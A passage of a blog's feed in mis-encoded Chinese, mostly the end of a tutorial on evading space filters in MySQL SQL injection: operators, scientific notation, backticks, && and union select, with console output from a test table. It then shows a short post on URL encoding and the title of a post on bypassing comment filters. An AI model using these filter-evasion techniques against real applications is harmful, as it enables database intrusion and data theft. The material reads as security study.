class="line"><span class="operator">|</span> <span class="variable">@var</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span>   <span class="number">10</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>æ ¹æ®ä¸Šé¢æµ‹è¯•æˆ‘ä»¬çœ‹å‡ºï¼Œå¯¹äºæ•´å‹å­—æ®µï¼Œç”¨æˆ·å®šä¹‰å˜é‡ç­‰å˜é‡ï¼Œç§‘å­¦è®¡æ•°æ³•å¹¶ä¸å¥½ä½¿ï¼Œå®ƒåªé€‚ç”¨äºå¸¸é‡ã€‚è™½ç„¶å…¶å¦‚æ­¤æœ‰å±€é™å‹ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ç”¨æ­¦ä¹‹åœ°ã€‚ä¸€èˆ¬ç”¨åœ¨where id=1e0 å¤„</p><p>ä¸‹é¢è¾¹æµ‹è¯•è¾¹å¯¹å…¶ç”¨æ³•è¿›è¡Œè®²è§£</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">desc</span> tuser;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> Field    <span class="operator">|</span> Type        <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> id       <span class="operator">|</span> tinyint(<span class="number">4</span>)  <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> username <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">20</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> passwd   <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">20</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œè¿™é‡Œæœ‰ä¸€å¼  tuser è¡¨ï¼Œid ä¸ºæ•´å‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span><span class="operator">+</span><span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.04</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span><span class="number">-1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">-1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">-1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ˜¯æ­£è´Ÿå·çš„æ¼”ç¤ºï¼Œå½“ç„¶æˆ‘ä»¬ä¸€èˆ¬ç”¨åœ¨æ•´å‹å­—æ®µä¸Šæ—¶ï¼Œéƒ½ç”¨æ­£å·ã€‚æˆ‘æµ‹è¯•è´Ÿå·åªæ˜¯ä¸ºäº†è®©ä½ çœ‹çš„æ›´æ¸…æ¥šã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> id.from tuser;</span><br><span class="line">ERROR <span class="number">1109</span> (<span class="number">42</span>S02): <span class="literal">Unknown</span> <span class="keyword">table</span> <span class="string">&#x27;id&#x27;</span> <span class="keyword">in</span> field list</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span><span class="operator">+</span>id<span class="number">-1</span><span class="operator">+</span><span class="number">1.</span><span class="keyword">from</span> tuser limit <span class="number">0</span>,<span class="number">4</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">+</span>id<span class="number">-1</span><span class="operator">+</span><span class="number">1.</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>æ ¹æ®ä¸Šé¢çš„æµ‹è¯•<code>+id-1+1.</code>ä¾¿æŠŠæ•´å‹å­—æ®µå‰åçš„ç©ºæ ¼éƒ½è§£å†³äº†ã€‚ï¼ˆæ³¨ï¼šæˆ‘ç”¨limit åªæ˜¯å› ä¸ºæˆ‘è¡¨ä¸­è®°å½•æ¯”è¾ƒå¤šè€Œå·²ï¼Œå¯ä»¥ä¸ç”¨ï¼Œæ²¡åˆ«çš„åŸå› ã€‚ï¼‰</p><p>æ³¨æ„ï¼šè¿™ç§æ–¹æ³•å¯¹ mysqlä¸­çš„æ•´å‹å­—æ®µ/è¿”å›å€¼ä¸ºæ•´å‹çš„éƒ½æ˜¯å¯ä»¥ç”¨çš„ï¼Œæ¯”å¦‚ï¼šcount()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span><span class="operator">+</span><span class="built_in">count</span>(id)<span class="operator">+</span><span class="number">1</span><span class="number">-1.</span><span class="keyword">from</span> tuser;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">+</span><span class="built_in">count</span>(id)<span class="operator">+</span><span class="number">1</span><span class="number">-1.</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line"><span class="operator">|</span>              <span class="number">16</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ï¼Œæ³¨æ„ï¼›limit åçš„æ•°å­—ç”¨è¿ç®—ç¬¦ä¼šæŠ¥é”™ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span><span class="comment">/**/</span>id <span class="keyword">from</span> tuser limit<span class="operator">+</span><span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line">ERROR <span class="number">1064</span> (<span class="number">42000</span>): You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;+0,1&#x27;</span> <span class="keyword">at</span> line <span class="number">1</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span><span class="comment">/**/</span>id <span class="keyword">from</span> tuser limit <span class="number">0</span>,<span class="number">-1</span>;</span><br></pre></td></tr></table></figure><h2 id="åå¼•å·">åå¼•å·</h2><p>å¼ºå¤§çš„åå¼•å·ï¼ˆä½ é”®ç›˜ esc ä¸‹é¢é‚£ä¸ªï¼‰è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨å®ƒæ¥åŒ…è£¹å¾ˆå¤šã€‚</p><p>å®ƒå¸¸å¸¸ç”¨æ¥åŒ…è£¹é‚£äº›ä¸æ˜¯æœ‰æ•ˆçš„identifiersï¼ˆå­—æ®µåï¼Œè¡¨åï¼Œåº“åï¼Œåˆ—åï¼Œåˆ«åï¼‰ï¼Œæ¯”å¦‚ï¼šidentifierä¸­æœ‰ç©ºæ ¼æˆ–è¿å­—ç¬¦æˆ–è€…ä¸å…³é”®å­—å†²çªï¼Œä½ åœ¨åˆ›å»ºæˆ–ä½¿ç”¨çš„æ—¶å€™ï¼Œå°±è¦ç”¨åå¼•å·åŒ…è£¹èµ·æ¥æ¥å’Œåˆ«çš„åŒºåˆ†å¼€äº†ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> id`ç¼–å·` <span class="keyword">from</span> tuser <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> limit <span class="number">0</span>,<span class="number">4</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span> ç¼–å·   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>å…·ä½“æ¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å®ƒæ¥åŒ…è£¹ï¼šå­—æ®µï¼Œåº“ï¼Œè¡¨ï¼Œåˆ«åï¼Œverison()ä¸­çš„version</p><p>ä½†æ˜¯ä¸å¯ä»¥åŒ…è£¹ database()ä¸­çš„ databaseã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span>`version`();</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="operator">|</span> `version`() <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">8.0</span><span class="number">.12</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span>`database`();</span><br><span class="line">ERROR <span class="number">1630</span> (<span class="number">42000</span>): <span class="keyword">FUNCTION</span> test.database does <span class="keyword">not</span> exist. <span class="keyword">Check</span> the <span class="string">&#x27;Function Name Parsing and Resolution&#x27;</span> section <span class="keyword">in</span> the Reference Manual</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span>`id`,`username`<span class="keyword">from</span>`tuser`<span class="keyword">where</span>`id`<span class="operator">=</span><span class="number">1e0</span><span class="keyword">order</span> <span class="keyword">by</span> username;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> username <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span>          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span>  <span class="number">3</span>fd     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span>  dewe    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> <span class="number">0</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> adam     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> adam     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> admin    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> admin    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> bob      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> bob      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+</span></span><br><span class="line"><span class="number">11</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span>`id`,`username`<span class="keyword">from</span>`tuser`<span class="keyword">where</span>`id`<span class="operator">=</span><span class="number">1e0</span><span class="keyword">union</span> <span class="keyword">select</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> username <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> admin    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> adam     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> bob      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> <span class="number">0</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span>          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span>  dewe    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span>  <span class="number">3</span>fd     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+</span></span><br><span class="line"><span class="number">9</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span>`id`,`username`<span class="keyword">from</span>`tuser`<span class="keyword">where</span>`id`<span class="operator">=</span><span class="number">1e0</span><span class="keyword">and</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> username <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> admin    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> adam     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> bob      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> admin    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> adam     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> bob      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> <span class="number">0</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span>          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span>  dewe    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span>  <span class="number">3</span>fd     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+</span></span><br><span class="line"><span class="number">11</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šè·¨åº“æŸ¥è¯¢æ—¶ï¼Œå¦‚æœè¦ä½¿ç”¨åå¼•å·ï¼Œåº“åå’Œè¡¨åéƒ½è¦åŠ åå¼•å·</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> schema_name <span class="keyword">from</span> `information_schema`.`schemata`;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> SCHEMA_NAME        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> mysql              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> information_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> performance_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sys                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> dvwa               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> test               <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> schema_name <span class="keyword">from</span> `information_schema.schemata`;</span><br><span class="line">ERROR <span class="number">1146</span> (<span class="number">42</span>S02): <span class="keyword">Table</span> <span class="string">&#x27;test.information_schema.schemata&#x27;</span> doesn<span class="string">&#x27;t exist</span></span><br></pre></td></tr></table></figure><p>æ ¹æ®ä¸Šé¢æµ‹è¯•çœ‹ï¼Œåå¼•å·ä¸è¿ç®—ç¬¦ã€å°æ•°ç‚¹ã€ç§‘å­¦è®¡æ•°æ³•ä¸€èµ·ä½¿ç”¨ï¼Œå°±å¯ä»¥ç»•è¿‡é™¤äº†order byã€union selectã€limit 1ä¸­é—´çš„ç©ºæ ¼äº†ã€‚é‚£ä¹ˆè¿™ä¸‰ä¸ªä¹‹é—´çš„ç©ºæ ¼å‘¢ï¼Ÿç›®å‰åªèƒ½é‡‡ç”¨ä¸Šé¢çš„ç¼–ç æˆ–å¤šè¡Œæ³¨é‡Šã€‚</p><h2 id="æ•°å­¦ç¬¦å·">æ•°å­¦ç¬¦å·</h2><p>å½“ç„¶ï¼Œä½¿ç”¨ and æˆ– orçš„æ—¶å€™æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡ä½¿ç”¨ä»–ä»¬çš„ç¬¦å·æ¥é¿å…åœ¨å…¶å‘¨å›´åŠ ç©ºæ ¼ã€‚æµ‹è¯•å¦‚ä¸‹ï¼ˆ|| ä¸&amp;&amp; æµ‹è¯•æ•ˆæœä¸€æ ·ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select`id`,`username`from`tuser`where`id`=1&amp;&amp;1=1;</span><br><span class="line">+------+----------+</span><br><span class="line">| id   | username |</span><br><span class="line">+------+----------+</span><br><span class="line">|    1 | admin    |</span><br><span class="line">|    1 | adam     |</span><br><span class="line">|    1 | bob      |</span><br><span class="line">|    1 | NULL     |</span><br><span class="line">|    1 | admin    |</span><br><span class="line">|    1 | adam     |</span><br><span class="line">|    1 | bob      |</span><br><span class="line">|    1 | 0        |</span><br><span class="line">|    1 |          |</span><br><span class="line">|    1 |  dewe    |</span><br><span class="line">|    1 |  3fd     |</span><br><span class="line">+------+----------+</span><br><span class="line">11 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select`id`,`username`from`tuser`where`id`=1&amp;&amp;1=0;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure><p>æœªå®Œå¾…ç»­...</p><h1 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h1><p><a href="https://dev.mysql.com/doc/refman/8.0/en/comments.html">MySQL9.6 Comment Syntax</a></p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>URL ç¼–ç é‚£ç‚¹å„¿äº‹</title>
      <link href="/blog/2019/08/04/network/url-encode/"/>
      <url>/blog/2019/08/04/network/url-encode/</url>
      
        <content type="html"><![CDATA[<p>æ²¡ä»€ä¹ˆå¥½å†™çš„äº†ï¼Œç½‘ä¸Šä¼˜ç§€çš„èµ„æ–™å¾ˆå¤šå‘€ã€‚æˆ‘å°±æ˜¯èµ„æºæ¬è¿å·¥ hahaã€‚</p><p>å¥½çš„åšæ–‡ï¼š</p><p><ahref="https://aotu.io/notes/2017/06/15/The-mystery-of-URL-encoding/index.html">URLç¼–ç çš„å¥¥ç§˜</a></p><p><ahref="http://www.ruanyifeng.com/blog/2010/02/url_encoding.html">å…³äº URLç¼–ç </a></p><p><a href="https://www.cnblogs.com/panchanggui/p/9436348.html">HTTP URLå­—ç¬¦è½¬ä¹‰ å­—ç¬¦ç¼–ç  ã€ RFC 3986 ç¼–ç è§„èŒƒ</a></p><p>å…³äºç©ºæ ¼åº”è¯¥è¢«ç¼–ç ä¸º%20ï¼Œè¿˜æ˜¯+ï¼Ÿç®€å•æ¥è¯´ï¼Œä¸¤ä¸ªæ ‡å‡†è§„å®šæœ‰äº›æ··ä¹±ï¼Œå¯¼è‡´åº”ç”¨ä»¬å®ç°èµ·æ¥ä¹Ÿæ¯”è¾ƒæ··ä¹±ã€‚</p><p>æ‘˜è‡ª<ahref="https://blog.csdn.net/stpeace/article/details/60371396">ç©ºæ ¼çš„ urlencode åˆ°åº•æ˜¯+è¿˜æ˜¯ ï¼Ÿ</a></p><blockquote><p>æ— è®ºæ˜¯å“ªç§è§„èŒƒï¼Œ url decode çš„æ—¶å€™ï¼Œ éƒ½èƒ½æ­£ç¡® decode.å®é™…ç»éªŒè¡¨æ˜ä¹Ÿç¡®å®å¦‚æ­¤ï¼</p></blockquote><p>æˆ‘ä»¬ä¸ç”¨ç®¡é‚£ä¹ˆå¤šï¼ŒçŸ¥é“éƒ½èƒ½ç”¨å°±è¡Œäº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç»•è¿‡æ³¨é‡Šè¿‡æ»¤</title>
      <link href="/blog/2019/08/04/websec/sql_injection/comment-filter/"/>
      <url>/blog/2019/08/04/websec/sql_injection/comment-filter/</url>
      
